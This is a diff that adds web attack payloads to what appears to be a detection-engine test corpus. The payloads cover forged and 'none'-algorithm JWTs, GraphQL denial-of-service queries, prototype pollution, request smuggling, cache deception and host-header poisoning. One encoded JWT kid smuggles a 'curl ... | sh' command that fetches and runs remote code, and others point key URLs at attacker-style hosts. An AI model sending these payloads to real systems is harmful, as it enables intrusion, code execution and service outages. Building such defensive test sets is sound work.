@@ -513,3 +513,55 @@ infra	/.well-known/caldav	M=PROPFIND
 infra	/console	H:Authorization=Basic YWRtaW46YWRtaW4=
 infra	/api/v4/projects?private_token=example-token-xxxxxxxxxxxx
 infra	/.env	H:User-Agent=python-requests/2.31.0
+# ============ JWT (engine 3) ============
+auth	/api/me	H:Authorization=Bearer eyJhbGciOiJOb25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+auth	/dashboard	H:Cookie=token=eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXJyeSJ9.; theme=dark
+auth	/api/profile	H:X-Access-Token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/admin	H:Cookie=session=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/users	H:Authorization=Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleS5wZW18Y3VybCBodHRwOi8vMTk4LjUxLjEwMC45L3guc2h8c2gifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/me	H:Authorization=Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3N5cy9rZXJuZWwvcmFuZG9taXplX3ZhX3NwYWNlIn0.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly8xOTguNTEuMTAwLjIzL2p3a3MuanNvbiJ9.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+~auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS9qd2tzLmpzb24iLCJraWQiOiIxIn0.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl	H:Host=app.example
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9ldmlsLmV4YW1wbGUvY2VydC5wZW0ifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+~auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8va2V5cy5iYWRhY3Rvci5leGFtcGxlL2MucGVtIn0.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl	H:Host=app.example
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.MAYCAQACAQA
+auth	/api/session?id_token=eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# ============ GRAPHQL ABUSE (engine 3) ============
+dos	/graphql?query=query{__schema{types{fields{type{fields{type{fields{type{fields{type{name}}}}}}}}}}}
+~dos	/graphql?query=query{u0:user(id:0){name} u1:user(id:1){name} u2:user(id:2){name} u3:user(id:3){name} u4:user(id:4){name} u5:user(id:5){name} u6:user(id:6){name} u7:user(id:7){name} u8:user(id:8){name} u9:user(id:9){name} u10:user(id:10){name} u11:user(id:11){name} u12:user(id:12){name} u13:user(id:13){name} u14:user(id:14){name} u15:user(id:15){name} u16:user(id:16){name} u17:user(id:17){name} u18:user(id:18){name} u19:user(id:19){name} u20:user(id:20){name} u21:user(id:21){name} u22:user(id:22){name} u23:user(id:23){name} u24:user(id:24){name} u25:user(id:25){name} u26:user(id:26){name} u27:user(id:27){name} u28:user(id:28){name} u29:user(id:29){name} u30:user(id:30){name} u31:user(id:31){name} u32:user(id:32){name} u33:user(id:33){name} u34:user(id:34){name} u35:user(id:35){name} u36:user(id:36){name} u37:user(id:37){name} u38:user(id:38){name} u39:user(id:39){name} u40:user(id:40){name} u41:user(id:41){name} u42:user(id:42){name} u43:user(id:43){name} u44:user(id:44){name} u45:user(id:45){name} u46:user(id:46){name} u47:user(id:47){name} u48:user(id:48){name} u49:user(id:49){name} u50:user(id:50){name} u51:user(id:51){name} u52:user(id:52){name} u53:user(id:53){name} u54:user(id:54){name} u55:user(id:55){name} u56:user(id:56){name} u57:user(id:57){name} u58:user(id:58){name} u59:user(id:59){name}}
+dos	/graphql?query=query{__typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa}
+dos	/v1/graphql?query={__type(name:"User"){fields{type{fields{type{fields{type{fields{type{fields{name}}}}}}}}}}}
+~dos	/gql?query={posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{author{posts{title}}}}}}}}}}}}}}}}}
+# ============ PROTOTYPE POLLUTION (engine 3) ============
+rce	/api/config/constructor/prototype/admin	M=POST
+rce	/x?data={"constructor":{"prototype":{"polluted":"yes"}}}
+rce	/api	H:X-Settings={"constructor":{"prototype":{"x":1}}}
+rce	/api/v1/__proto__/polluted?value=1
+rce	/api/merge	M=POST	H:X-Patch={"__proto__":{"status":510}}
+# ============ REQUEST SMUGGLING (engine 3) ============
+~protocol	/static/app.css	H:Content-Length=35
+~protocol	/	M=POST	H:Connection=keep-alive, Transfer-Encoding	H:Transfer-Encoding=chunked
+~protocol	/	M=POST	H:Connection=Content-Length	H:Content-Length=5
+~protocol	/robots.txt	H:Content-Length=60	H:Connection=keep-alive
+~protocol	/login	M=POST	H:Transfer-Encoding=chunked	V=1.0
+# ============ PATH NORMALIZATION & CACHE DECEPTION (engine 3) ============
+~protocol	/%2e/admin
+~protocol	/.;/console
+~traversal	/media../config.js
+~protocol	/api/v1/%2e;/users
+~protocol	/profile%3fx.js
+~protocol	/my-account%3f.png
+~protocol	/user/orders%3Fa.woff2
+# ============ HOST HEADER & CACHE POISONING (engine 3) ============
+~protocol	/	H:Host=app.example@evil.example
+protocol	/reset-password	H:X-Forwarded-Host=a1b2c3.oastify.com
+~protocol	/	H:Forwarded=for=198.51.100.1;host=evil.example"/x
+~protocol	/	H:X-Forwarded-Proto=nothttps
+protocol	/	H:X-Forwarded-Server=x.burpcollaborator.net
+~protocol	/	H:Host=app.example, evil.example
+# ============ NEXT.JS / VITE (engine 3) ============
+cve	/	H:x-now-route-matches=1
+~cve	/	M=POST	H:Next-Action=1	H:Next-Router-State-Tree=%5B%22%22%5D
+~cve	/api/next	H:Location=https://evil.example/
+cve	/@id/x?import&?inline=1.wasm?init
